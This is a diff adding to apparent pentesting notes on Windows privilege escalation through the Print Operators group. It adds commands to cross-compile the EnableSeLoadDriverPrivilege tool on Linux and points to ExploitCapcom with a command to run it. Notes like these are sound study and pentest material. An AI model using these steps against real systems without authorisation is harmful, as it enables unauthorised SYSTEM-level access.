@@ -174,6 +174,8 @@ Members of the Server Operators group can administer domain controllers. They ca
 
 Refer to [Windows services](services.md) notes or [Backup Operators](#backup-operators--access-any-file) notes.
 
+<br>
+
 #### Print Operators
 
 *-- Grants the SeLoadDriverPrivilege among other privileges --*
@@ -216,4 +218,33 @@ You may use `cl` from Visual Studio or Windows SDK:
 PS> cl.exe /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
 ```
 </details>
+
+<details class="details-n">
+<summary>Compile EnableSeLoadDriverPrivilege.cpp on Linux</summary>
+
+Add the following headers:
+
+```cpp
+#include <windows.h>
+#include <assert.h>
+#include <winternl.h>
+#include <sddl.h>
+#include <stdio.h>
+#include "tchar.h"
+<...>
+```
+
+Install either `g++-mingw-w64-i686` or `g++-mingw-w64-x86-64` according to your architecture <small>($env:PROCESSOR_ARCHITECTURE)</small>. 
+```shell!
+$ sed -i -e 's/%\(.*\)ws/%\1ls/g' EnableSeLoadDriverPrivilege.cpp # %ls on Linux (even if target is Windows)
+$ x86_64-w64-mingw32-g++ -DUNICODE -D_UNICODE -municode -mconsole -o EnableSeLoadDriverPrivilege.exe EnableSeLoadDriverPrivilege.cpp -lntdll -luser32 -ladvapi32 -static-libgcc -static-libstdc++ -O2
+$ strip EnableSeLoadDriverPrivilege.exe
+```
+</details>
+
+You can exploit the driver using [ExploitCapcom](https://github.com/tandasat/ExploitCapcom) <small>(0.3k ⭐, 2022 🪦)</small>:
+
+```shell!
+PS> .\ExploitCapcom.exe
+```
 </div></div>
